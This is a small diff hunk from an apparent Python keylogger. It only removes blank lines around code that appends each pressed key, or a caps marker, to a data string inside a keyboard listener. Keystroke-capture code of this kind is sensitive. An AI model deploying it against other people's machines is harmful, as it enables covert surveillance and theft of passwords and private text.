@@ -48,9 +48,6 @@ if sys.version_info.major >= 3:
                 data += " _CAPS_ " #Requires rework to detect caps on or off and covert string.
             else:
                 data += str(key).strip("'")
-                
-            
-            
 
         with keyboard.Listener(on_press=on_press) as listener:
             return_data()
